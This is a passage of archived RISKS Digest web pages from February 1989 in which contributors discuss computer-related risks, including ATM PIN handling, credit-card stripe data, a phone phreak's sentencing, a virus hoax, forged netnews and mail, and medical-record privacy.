that technology is quite mature already.  The article pointed out that the
major news publishers such as Time own digital processing devices that put the
best airbrush artist to shame.  It is quite easy to merge unrelated images,
superimposing a person in a scene he never visited, and to cover all the seams.
It is also easy to remove unwanted objects and blend in the background to cover.

The claim in this article was that photographic images were no longer
worthwhile as evidence of anything.  I suspect that is a bit strong; the
testimony of a photographer that her record is honest would probably hold
water.  (After all, the notes of a police officer can be altered, but are
admissable when read as part of testimony.)  Also, few currently have direct
access to this technology.
 
But the risks are real.

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
PIN?  Who needs a PIN?  (Alan Wexelblat, <A HREF="/Risks/8.26.html">RISKS-8.26</A>)
</A>
</H3>
<address>
&lt;<A HREF="mailto:bill%zycor%ugn%hdr%mcmi%uunet@ames.UUCP">
bill%zycor%ugn%hdr%mcmi%uunet@ames.UUCP
</A>&gt;
</address>
<i>
Sat, 18 Feb 89 01:10:44 -0500
</i><PRE>

Like most ATMs, the Diebolds (there are several models) are programmable from
the host computer. This can include modes where the pin is read and encrypted
(DES) before sending, or where the PIN is read and sent in the clear, or where
the pin is not even read. It would seem a little strange to run the ATM in the
last mode, but I have seen a system in the UK where the PIN is transmitted over
a bisync line with no encryption whatsoever. In any case, the menus, the "fast
$xx" amount, the order of operations when processing a user transaction, etc.
are all remotely programmable. It could be that the ATM you were at had been
incorrectly programmed, but generally there is one file in the host that
contains the ATM information, and this is just sent down over the wire to all
of them.  Your name was probably encoded on track 1 or 3 of the card.

                    [That does open up some significant vulnerabilities.  PGN]

On a related note, I noticed quite a risk using credit cards.  We are currently
implementing a credit card (CC) authorization system for retail stores, and the
handy way to test it seemed to be to run my own card through the magnetic
reader. Now, a CC has a "track two" where the account information is encoded.
After the account information, there is a special character that serves as a
field sep, and then "issuing bank discretionary data" follows. In this field
the first four are usually the expiration date on the card.  In the case of
Commercial Federal here in Omaha, my checking account is there, AND it is the
issuing bank for my CC.  Imagine my suprise when testing the card reader with
my CC. The CC account is there, so is the expiration date, followed immediately
by MY CHECKING ACCOUNT NUMBER at Commercial Federal! So apparently my bank
account number is going over the wire every time I buy something with my Visa...

Bill Mahoney

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.27.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.29.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-79</DOCNO>
<DOCOLDNO>IA013-000132-B046-403</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.29.html 128.240.150.127 19970217025716 text/html 20606
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:55:32 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 29</TITLE>
<LINK REL="Prev" HREF="/Risks/8.28.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.30.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.28.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.30.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 29</H1>
<H2> Wednesday 22 February 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  Overloaded computer delays (overworked) commuters 
</A>
<DD>
<A HREF="#subj1.1">
Steve Graham
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Chicago Phone Freak Gets Prison Term 
</A>
<DD>
<A HREF="#subj2.1">
Patrick Townson via Cliff Stoll
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Computer Confinement 
</A>
<DD>
<A HREF="#subj3.1">
Joseph M. Beckman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Police officers sentenced for misuse of PNC 
</A>
<DD>
<A HREF="#subj4.1">
Nigel Roberts
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  The word "virus" causes panic 
</A>
<DD>
<A HREF="#subj5.1">
Nigel Roberts
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Re: Faking Internet mail 
</A>
<DD>
<A HREF="#subj6.1">
Steve Bellovin
</A><br>
<A HREF="#subj6.2">
 Kevin S. McCurley
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Overloaded computer delays (overworked) commuters
</A>
</H3>
<address>
&lt;<A HREF="mailto:Owen Plowman <owen@oracle.com>     [Really Steve Graham]">
Owen Plowman &lt;owen@oracle.com&gt;     [Really Steve Graham]
</A>&gt;
</address>
<i>
Tue, 21 Feb 89 14:31:14 EDT
</i><PRE>

This message actually comes to you from Steve Graham
(sgraham@cnseq1.oracle.com), and not from me (Owen Plowman).

 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

You might find this interesting. It is a 'COMMUTER BULLETIN' published
by Government of Ontario [GO] Transit. I and everyone using the system 
was affected by it.

[GO Transit trains serve a wide area around Toronto, transporting
commuters between the downtown area and surrounding communities.  I
believe that the trains are operated for the Provincial Government by
Canadian National Railways]

February 15, 1989


SIGNAL COMPUTER DELAYS RUSH-HOUR GO TRAINS

Homebound GO Train riders were subjected to delays of up to 80 minutes
on Monday and Tuesday evenings.

The delays were caused by a shortage of capacity in the new computer
recently installed by CN Rail to control the signalling on its main line
between Toronto and Hamilton. In the late afternoon, this line is heavily
used over its entire length, and the computer has not been able to process
signal and routing requests as rapidly as the traffic requires.

GO's Lakeshore trains use this line and were seriously affected. Also
delayed were trains on the Milton, Georgetown, Bradford and Stouffville
lines, whose equipment encountered the signal problems between Union
Station and GO's maintenance facility in Mimico. Compounding the delays
were several locomotive malfunctions as well.

CN hopes to have the computer problem solved by the end of this week. In
the meantime, the railway is altering its operating procedures in order to
minimize further impact on GO riders.

GO apologizes for this inconvenience.

 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

Steve Graham, Oracle Corporation Canada, Toronto, Ontario, M5J 2M4
Opinions expressed in this message are those of the author.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Chicago Phone Freak Gets Prison Term
</A>
</H3>
<address>
Cliff Stoll
&lt;<A HREF="mailto:cliff%cfa204@harvard.harvard.edu ">
cliff%cfa204@harvard.harvard.edu 
</A>&gt;
</address>
<i>
Mon, 20 Feb 89 01:36:57 est
</i><PRE>

From: telecom@eecs.nwu.edu (TELECOM Moderator)        [From Patrick Townson]
Newsgroups: comp.dcom.telecom
Subject: Chicago Phreak Gets Prison Term
Date: 17 Feb 89 06:47:45 GMT
X-TELECOM-Digest: volume 9, issue 65, message 1 of 5

An 18 year old telephone phreak from the northside/Rogers Park community
in Chicago who electronically broke into U.S. military computers and AT&amp;T
computers, stealing 55 programs was sentenced to nine months in prison on
Tuesday, February 14 in Federal District Court here.

Herbert Zinn, Jr., who lives with his parents on North Artesian Avenue in
Chicago was found guilty of violating the Computer Fraud and Abuse Act of
1986 by Judge Paul E. Plunkett. In addition to a prison term, Zinn must pay
a $10,000 fine, and serve two and a half years of federal probation when
released from prison.

United States Attorney Anton R. Valukas said, "The Zinn case will serve to
demonstrate the direction we are going to go with these cases in the
future. Our intention is to prosecute aggressively. What we undertook is to
address the problem of unauthorized computer intrusion, an all-too-common
problem that is difficult to uncover and difficult to prosecute..."

Zinn, a dropout from Mather High School in Chicago was 16-17 years old at
the time he committed the intrusions, using his home computer and modem.
Using the handle 'Shadow Hawk', Zinn broke into a Bell Labs computer in
Naperville, IL; an AT&amp;T computer in Burlington, NC; and an AT&amp;T computer at
Robbins Air Force Base, GA. No classified material was obtained, but the
government views as 'highly sensitive' the programs stolen from a computer
used by NATO which is tied into the U.S. missle command. In addition, Zinn
made unlawful access to a computer at an IBM facility in Rye, NY, and into
computers of Illinois Bell Telephone Company and Rochester Telephone Company,
Rochester, NY.

Assistant United States Attorney William Cook said that Zinn obtained access
to the AT&amp;T/Illinois Bell computers from computer bulletin board systems,
which he described as '...just high-tech street gangs'. During his bench
trial during January, Zinn spoke in his own defense, saying that he took the
programs to educate himself, and not to sell them or share them with other
phreaks. The programs stolen included very complex software relating to
computer design and artificial intelligence. Also stolen was software used
by the BOC's (Bell Operating Companies) for billing and accounting on long
distance telephone calls.

The Shadow Hawk -- that is, Herbert Zinn, Jr. -- operated undetected for at
least a few months in 1986-87, but his undoing came when his urge to brag
about his exploits got the best of him. It seems to be the nature of phreaks
that they have to tell others what they are doing. On a BBS notorious for
its phreak/pirate messages, Shadow Hawk provided passwords, telephone numbers
and technical details of trapdoors he had built into computer systems,
including the machine at Bell Labs in Naperville.

What Shadow Hawk did not realize was that employees of AT&amp;T and Illinois
Bell love to use that BBS also; and read the messages others have written.
Security representatives from IBT and AT&amp;T began reading Shadow Hawk's
comments regularly; but they never were able to positively identify him.
Shadow Hawk repeatedly made boasts about how he would 'shut down AT&amp;T's
public switched network'. Now AT&amp;T became even more eager to locate him.
When Zinn finally discussed the trapdoor he had built into the Naperville
computer, AT&amp;T decided to build one of their own for him in return; and
within a few days he had fallen into it. Once he was logged into the system,
it became a simple matter to trace the telephone call; and they found its
origin in the basement of the Zinn family home on North Artesian Street in
Chicago, where Herb, Jr. was busy at work with his modem and computer.

Rather than move immediatly, with possibly not enough evidence for a good,
solid conviction, everyone gave Herb enough rope to hang himself. For over
two months, all calls from his telephone were carefully audited. His illicit
activities on computers throughout the United States were noted, and logs
were kept. Security representatives from Sprint made available notes from
their investigation of his calls on their network. Finally the 'big day'
arrived, and the Zinn residence was raided by FBI agents, AT&amp;T/IBT security
representatives and Chicago Police detectives used for backup. At the time
of the raid, three computers, various modems and other computer peripheral
devices were confiscated. The raid, in September, 1987, brought a crude
stop to Zinn's phreaking activities. The resulting newspaper stories brought
humiliation and mortification to Zinn's parents; both well-known and
respected residents of the Rogers Park neighborhood. At the time of the
younger Zinn's arrest, his father spoke with authorities, saying, "Such a
good boy! And so intelligent with computers!"

It all came to an end Tuesday morning in Judge Plunkett's courtroom here,
when the judge imposed sentence, placing Zinn in the custody of the Attorney
General or his authorized representative for a period of nine months; to
be followed by two and a half years federal probation and a $10,000 fine.
The judge noted in imposing sentence that, "...perhaps this example will defer
others who would make unauthorized entry into computer systems." Accepting the
government's claims that Zinn was 'simply a burglar; an electronic one...
a member of a high-tech street gang', Plunkett added that he hoped Zinn
would learn a lesson from this brush with the law, and begin channeling his
expert computer ability into legal outlets. The judge also encouraged Zinn
to complete his high school education, and 'become a contributing member of
society instead of what you are now, sir...'

Because Zinn agreed to cooperate with the government at his trial, and at
any time in the future when he is requested to do so, the government made
no recommendation to the court regarding sentencing. Zinn's attorney asked
the court for leniency and a term of probation, but Judge Plunkett felt
some incarceration was appropriate. Zinn could have been incarcerated until
he reaches the age of 21.

His parents left the courtroom Tuesday with a great sadness. When asked to
discuss their son, they said they preferred to make no comment.

Patrick Townson

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
 Computer Confinement
</A>
</H3>
<address>
"Joseph M. Beckman" 
&lt;<A HREF="mailto:Beckman@DOCKMASTER.ARPA">
Beckman@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Wed, 22 Feb 89 07:54 EST
</i><PRE>

     [Joseph included an article From the Washington Times (2-16-89) and
     commented thusly:]

It is interesting that the judge wants this person to reform with computers.
One would find it incongruous to direct, say, an alcoholic to work in a liquor
store (a legal outlet), or an embezzler to work in another financial
institution, etc.  Perhaps the penalty or terms of probation should call for
the abuser to stay away from that which he is abusing or using to break the law.
                                             Joseph

     [Article also noted by Rodney Hoffman &lt;Hoffman.ElSegundo@Xerox.com&gt;.]

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Police officers sentenced for misuse of PNC
</A>
</H3>
<address>
Nigel Roberts
&lt;<A HREF="mailto:roberts%untadh.DEC@decwrl.dec.com ">
roberts%untadh.DEC@decwrl.dec.com 
</A>&gt;
</address>
<i>
Mon, 20 Feb 89 02:48:11 PST
</i><PRE>

SUSPENDED SENTENCES FOR COMPUTER BREAK-IN

Three police officers hired by private investigators to break into the
Police National Computer received suspended prison sentences at Winchester
Crown Court. The private investigators also received suspended (prison) 
sentences, ranging from four to six months.

The police officers were charged under the Official Secrets Act of conspiring
to obtain confidential information from the Police National Computer at Hendon.

One of the police officers admitted the charge, but the other two and the
private investigators pleaded Not Guilty.

The case arose out of a TV show called _Secret Society_ in which private
investigator Stephen Bartlett was recorded telling journalist Duncan 
Campbell that he had access to the Police National Computer, the
Criminal Records Office at Scotland Yard and the DHSS [Department
of Health &amp; Social Security --nr] computer.

Bartlett said he could provide information on virtually any person on a few
hours. He said he had the access through certain police officers at
Basingstoke, Hampshire. Although an investigatation proved the 
Basingstoke connection to be false, the trail led to other police officers
and private detectives elsewhere.

Most of the information gleaned from the computers was used to determine
who owned certain vehicles, who had a good credit record -- or even who
had been in a certain place at a certain time for people investigating
marital infidelity.

			-- From _Personal Computing Weekly_
			   dated 9/15-Feb-1989.

[Of course, the actions for which the officers and others were sentenced,
were not computer break-ins as such, but rather misuse of legitimate
access. 

It seems the phrase "break-in", applied to computers, is almost as 
fashionable as "virus" with the media at the moment --nr]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
The word "virus" causes panic
</A>
</H3>
<address>
Nigel Roberts
&lt;<A HREF="mailto:roberts%untadh.DEC@decwrl.dec.com ">
roberts%untadh.DEC@decwrl.dec.com 
</A>&gt;
</address>
<i>
Mon, 20 Feb 89 02:41:19 PST
</i><PRE>

VIRUS HOAX CAUSED AS MUCH PANIC AS THE REAL THING

Sixth-form student [high-school--nr] and _Popular Computing Weekly_ reader
Michael Banbrook gave his college network managers a scare when he 
planted a message saying that a virus was active on the college system.

Banbrook's message appeared whenever a user miskeyed a password; the
usual message would be 
	"You are not an authorised user".

It was replaced by the brief but sinister:
	"A Virus is up and running".

When the message was discovered by the college network manager, Banbrook
was immediately forbidden access to any computers at the St. Francix Xavier
Collegs at Clapham in South London.

Banbrook, 17, told _Popular Computing Weekly_ that he believed the college
has over-reacted and that he had, in fact thrown a spotlight on the college's
lacklustre network security. The college has a 64 node RM Nimbus network
running MS-DOS.

"All any has to do is change a five-line DOS batch file" says Banbrook.
"There is no security at all"

Banbrook admits his motives were not entirely related to enhancing security:
"I was just bored and started doodling and where some people would doodle 
with a notepad, I doodle on a keyboard. I never thought anyone would
believe the message"

Banbrook was suspended from computer science A-level classes and forbidden to
use the college computers for a week before it was discovered that no virus
existed. Following a meeting between college principal Bryan Scalune and
Banbrook's parents, things are said to be "back to normal".

				-- from Popular Computing Weekly
				   dated 9-15/Feb/89


[I think there are several lessons here. The college seems to have been using
networked PCs without realising that how an informed ordinary user could change
system messages for everyone on the network. The student himself doesn't 
seem to have been aware of the possible consequences of his "doodling" 
(echoes of the discussion of the need to educate people about ethics and 
"proper use"), and of course it is highly revealing to note the knee-jerk 
way everone reacted when they saw the currently fashionable buzz-word 
"virus" on their screens --nr]

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Re: Faking Internet mail [Re: <A HREF="/Risks/8.27.html">RISKS-8.27</A>]
</A>
</H3>
<address>
&lt;<A HREF="mailto:smb@research.att.com">
smb@research.att.com
</A>&gt;
</address>
<i>
Sun, 19 Feb 89 21:10:07 EST
</i><PRE>

Yes, it's just as easy to fake netnews articles.  In fact, if you're a
bit careful, you can not only spoof someone, you can arrange things so
that the victim doesn't even see the forged article.

Back when we were designing the original protocols, we discussed the security
issue.  Since we were using a completely unauthenticated transport medium
(uucp), at least as far as the application layer was concerned, we felt that
there could be no real security; consequently, we elected to omit all control
messages.  That decision was subsequently changed by later implementors, and
there have indeed been a few problems, albeit mostly inadvertent.  But the
first public release of ``B netnews'' had some very serious security problems
indeed; a forged control message could be used to remove every file belonging
to the owner of netnews.  In the best case, that was ``merely'' every stored
netnews article; in the worst case -- some implementation quirks in then-
current versions of the UNIX system -- the recursive remove command would run
as root, and could wipe the entire file system.

I don't remember why we didn't adopt a public-key system during the initial
design phase; we certainly knew about them, and even had some code (the V7
xsend/xget commands) to model ours on.  Most likely, we didn't see the need; we
expected a maximum size of 50-100 sites, and 1-2 messages/day.
                                                               --Steve Bellovin

</PRE>
<HR><H3><A NAME="subj6.2">
Faking Internet mail
</A>
</H3>
<address>
"Kevin S. McCurley" 
&lt;<A HREF="mailto:mccurley@IBM.com">
mccurley@IBM.com
</A>&gt;
</address>
<i>
Sun, 19 Feb 89 22:15:54 PST
</i><PRE>

I guess a lot of people know about faking internet mail.  Since the National
Science Foundation now accepts reviews of proposals via email, I wonder whether
anybody there knows about this ?  It is rather farfetched to think that
somebody would try to fake their reviews, but I wonder if there are many other
examples where individuals or organizations are leaving themselves open to
fraud this way...

Kevin McCurley, IBM Almaden Research Center

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.28.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.30.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-80</DOCNO>
<DOCOLDNO>IA013-000132-B046-425</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.30.html 128.240.150.127 19970217025741 text/html 23012
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:56:12 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 30</TITLE>
<LINK REL="Prev" HREF="/Risks/8.29.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.31.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.29.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.31.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 30</H1>
<H2> Friday 24 February 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  "Do you know who's reading your medical records?" 
</A>
<DD>
<A HREF="#subj1.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Wells Fargo ATM outage 
</A>
<DD>
<A HREF="#subj2.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  New York 540 Phone Number Scam 
</A>
<DD>
<A HREF="#subj3.1">
John Murray
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  900 "confession" number 
</A>
<DD>
<A HREF="#subj4.1">
Randal L. Schwartz
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: Chicago Phone Freak Gets Prison Term 
</A>
<DD>
<A HREF="#subj5.1">
Rich Salz
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Reach Out and Spy on Someone 
</A>
<DD>
<A HREF="#subj6.1">
Peter Scott
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Power failure problems 
</A>
<DD>
<A HREF="#subj7.1">
Jonathan I. Kamens
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Photographs as evidence (re: digital editing, etc.) 
</A>
<DD>
<A HREF="#subj8.1">
Ernest H. Robl
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Stanford and rec.humor.funny 
</A>
<DD>
<A HREF="#subj9.1">
Martin Minow
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
"Do you know who's reading your medical records?" 
</A>
</H3>
<address>
Peter Neumann 
&lt;<A HREF="mailto:neumann@csl.sri.com">
neumann@csl.sri.com
</A>&gt;
</address>
<i>
Fri, 24 Feb 1989 11:18:27 PST
</i><PRE>

Of considerable interest to RISKSers is an article entitled "Absolutely NOT
Confidential" by Clark Norton, in the March/April 1989 issue of Hippocrates
(The Magazine of Health and Medicine).  The article documents many of the
problems of large networked databases, including privacy, data quality, legal
and social implications, etc.  It also includes a state-by-state table on your
access to your own medical records, with separate entries for doctors',
hospitals', and mental health records.  Arkansas, New Hampshire, Rhode Island,
South Carolina, Vermont, and Wyoming are the only states left with no laws
guaranteeing your access for all three types of records.  Thus far, Montana is
the only state to adopt a model bill drafted by the National Conference of
Commissioners on Uniform State Laws.

``Like most Americans, you've probably assumed your medical records were
confidential -- protected by ethics and the law.  At one time you would have
been right.  "We used to have a medical system that was confidential," says
retired Harvard School of Medicine neurosurgeon Vernon Mark...''  Now it is
relatively wide open.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Wells Fargo ATM outage
</A>
</H3>
<address>
Peter Neumann 
&lt;<A HREF="mailto:neumann@csl.sri.com">
neumann@csl.sri.com
</A>&gt;
</address>
<i>
Fri, 24 Feb 1989 11:02:52 PST
</i><PRE>

445 of Wells Fargo's 1200 ATMs in California were out of commission for many
hours on 22 Februrary 1989, due to computer malfunctions.  (Bank of America has
twice had about 700 ATMs out of commission in recent months.)

  `John Love, publisher of Bank Network News, a newsletter that covers
  electronic banking, said that, on the average, ATMs are down 5 percent of the
  time because of ``machine-specific problems.''  However, such widespread
  failures are rare, he said, because of extensive backup computer networks.'
  [Quote from the San Francisco Chronicle, 23 Feb 89, pp. C1 and C18, in an
  article by David Tuller.]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
New York 540 Phone Number Scam
</A>
</H3>
<address>
John Murray
&lt;<A HREF="mailto:johnm@uts.amdahl.com ">
johnm@uts.amdahl.com 
</A>&gt;
</address>
<i>
24 Feb 89 02:31:46 GMT
</i><PRE>

 Just picked this up from comp.dcom.telecom
  - John Murray , Amdahl Corp., Sunnyvale, CA.

  From wrf@ecse.rpi.edu Tue Feb 21 07:50:32 1989
  Subject: 540 ripoff

  NYS just fined a ripoff outfit that advertised a "GOLD" card if you called
  540-GOLD.  Several hundred people who did, and stayed on the line for a
  minute, were billed $50 (FIFTY DOLLARS).  Needless to say their gold card had
  no relation to Mastercard or Amex.  They were also contacting people with an
  illegal autodial operation that would not let the victim hang up to free the
  line.  I think now they're required to say at the start of the call that there
  is this charge.  But what about people whose hearing is bad or English poor?

  People in every state should have the right to disable this use of their
  phone as a no limit credit card.  In fact, the default status should be
  disabled, and phone customers should have to enable it, and perhaps specify a
  $limit, if they want to use it.

[Moderator's Note: Illinois Bell was one of the first telephone companies
to offer 900/976 blocking at no charge, no questions asked. We do not have
'540' service here -- yet -- but I assume any variation on it here would
get free blocking. Here you can block 976 or 900 or both. The operator is
unable to complete the connection for you. Out-of-LATA 976 calls cannot be
blocked, but then they are only billed at regular long distance rates
anyway.   PT]

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
900 "confession" number
</A>
</H3>
<address>
Randal L. Schwartz 
&lt;<A HREF="mailto:merlyn@intelob.intel.com">
merlyn@intelob.intel.com
</A>&gt;
</address>
<i>
Wed, 22 Feb 89 10:19:15 PST
</i><PRE>

(Quotes are from an article in the Feb 27 "Insight on the News" magazine)

The latest craze is a 900 number in which callers can "confess" their actions.

   Another of those adult phone lines, you think, and prepare to hang
   up.  But then there is another voice, female, young, and
   remorseful.  "I'm having an affair with Bob.  He's my boss, and I
   just gave up our baby," she says.  "I want to tell Ginne and Les to
   please take care of her and I hope that she grows up to be better
   than I was and [pause] I'm sorry."

   [...] Confessors leave a 60-second message on what amounts to an
   elaborate answering machine, then the tape is edited for playback
   on the other phone line.  Sometimes listeners call in to respond to
   someone's confession, and some of these calls are played back.

Now, here's the scary part...

   Denton [producer of the Phone Confessions program] listens to every
   call, then selects a mix of confessions for playback.  Most calls
   are about relationships, but United Communications [the producer's
   company] makes no secret that it gets calls from people confessing
   to crimes [!!].

Most people probably still believe that the phone number from which
they make a phone call is available *only* to a select few.  But with
the 800 and 900 phone services (discussed either in RISKS or TELECOM,
I lost track :-), a service-provider can obtain *instantly* the caller's
phone number, and correlate it with the confessions.

The risks to the public (out of ignorance) is obvious.  Law enforcement
agencies, or even private opportunists, could set up such services,
or tap into existing services, and obtain an unending supply of useful
information.  Says the article:

   Denton believes that 98 percent of her calls are true confessions.

I suppose if I really wanted to confess a crime to one of these
services, I'd go to a pay phone.  I doubt that the public is aware of
the consequences of calling from their home, though.

Randal L. Schwartz, Stonehenge Consulting Services (503)777-0095
on contract to BiiN (for now :-), Hillsboro, Oregon, USA.

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: Chicago Phone Freak Gets Prison Term (RISKS 8.29)
</A>
</H3>
<address>
Rich Salz 
